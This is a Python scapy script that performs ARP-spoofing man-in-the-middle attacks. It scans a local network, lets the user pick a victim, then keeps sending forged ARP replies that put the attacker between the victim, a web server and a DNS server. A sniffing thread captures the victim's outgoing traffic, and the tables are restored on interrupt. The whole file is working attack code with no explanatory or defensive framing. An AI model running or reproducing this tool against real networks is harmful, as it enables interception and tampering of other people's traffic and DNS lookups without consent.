import scapy.all as scapy
import time
import threading

#Define victim IP and Server IP -> automatize, let user select victim also implement sniffing instead of spamming
VICTIM_IP = "192.168.50.20"
DNS_SERVER_IP = "192.168.50.30"
WEB_SERVER_IP = "192.168.50.40"
INTERFACE = "eth1"
NETWORK_RANGE = "192.168.50.0/24"

#Get mac adress of the victim

def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]


    return answered_list[0][1].hwsrc

def spoof(VICTIM_IP, spoof_ip):
    mac_target = get_mac(VICTIM_IP)
    packet = scapy.ARP(op=2, pdst=VICTIM_IP, hwdst=mac_target, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=mac_target)
    scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)

def restore(destination_ip, source_ip):
    destination_ip_mac = get_mac(destination_ip)
    source_ip_mac = get_mac(source_ip)
    ether_frame = scapy.Ether(dst=destination_ip_mac)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
    scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)

def sniff_outgoing_packets(victim_ip):
    def packet_callback(packet):
        print(packet.summary())
    print(f"Starting to sniff outgoing packets from {victim_ip}...")
    scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)

def run_spoofing(victim=VICTIM_IP, server=WEB_SERVER_IP):
    # Start sniffing thread
    sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
    sniff_thread.start()

    sent_packets_count = 0
    print(f"Starting ARP poisoning: {victim} <-> {server}")
    try:
        while True:
            spoof(victim, server)
            spoof(server, victim)
            spoof(victim,DNS_SERVER_IP)
            spoof(DNS_SERVER_IP,victim)
            sent_packets_count = sent_packets_count + 2
            print(f"\rPackets Sent: {sent_packets_count}", end="")
            
            time.sleep(2)

    except KeyboardInterrupt:
        restore(victim, server)
        restore(server, victim)
        restore(victim,DNS_SERVER_IP)
        restore(DNS_SERVER_IP,victim)
        print("\nAttack stopped and ARP tables restored")

def main():
    request = scapy.ARP(pdst=NETWORK_RANGE)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether / request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]

    hosts = []

    for sent, received in answered_list:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices in the network:")
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for host in hosts:
        print(f"{host['ip']}\t\t{host['mac']}")
    request_input = input("Select the target IP address: ").strip()
    if request_input in [host['ip'] for host in hosts]:    
        run_spoofing(request_input)
    else: print("\nInvalid target")

if __name__ == "__main__":
    main()